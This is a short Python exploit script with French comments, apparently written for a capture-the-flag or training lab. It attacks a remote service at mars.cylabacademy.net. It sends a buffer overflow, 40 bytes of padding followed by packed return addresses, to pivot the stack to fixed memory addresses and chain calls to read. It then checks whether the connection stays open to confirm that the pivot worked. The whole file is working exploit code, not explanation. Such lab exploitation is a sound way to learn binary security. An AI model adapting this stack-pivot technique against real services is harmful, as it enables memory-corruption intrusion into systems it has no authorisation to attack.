import sys, socket, time, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31809
READ_CALL = 0x400b80
STAGE = 0x602900


def p64(x):
    return struct.pack("<Q", x)


s = socket.create_connection((HOST, PORT), timeout=15)
s.settimeout(4)
time.sleep(0.3)
try:
    s.recv(4096)
except Exception:
    pass
# stage 1 : pivot vers 0x602900, revient sur read -> ecrit a 0x6028E0
s.sendall(b"A" * 40 + p64(STAGE) + p64(READ_CALL))
time.sleep(0.5)
# stage 2 : ecrit a 0x6028E0 ; [0x20 filler][rbp=0x602980][read] -> repivote
s.sendall(b"B" * 0x20 + p64(0x602980) + p64(READ_CALL))
time.sleep(0.8)
# si le pivot fonctionne, le programme attend un 3e input
try:
    s.sendall(b"C" * 0x20 + p64(0x602A00) + p64(READ_CALL))
    time.sleep(0.6)
    s.sendall(b"END".ljust(0x20, b"\x00") + p64(0) + p64(0x4141414141414141))
    time.sleep(0.8)
except Exception as e:
    print("envoi 3/4 echoue:", type(e).__name__)
out = b""
closed = False
try:
    while True:
        c = s.recv(4096)
        if not c:
            closed = True
            break
        out += c
except socket.timeout:
    pass
except Exception:
    closed = True
print("sortie:", len(out), "ferme:", closed)
print("dernier extrait:", repr(out[-120:]))
# si pas ferme, la connexion attend encore -> pivot OK
print("PIVOT:", "OK (connexion encore ouverte)" if not closed else "echec (fermee)")
s.close()
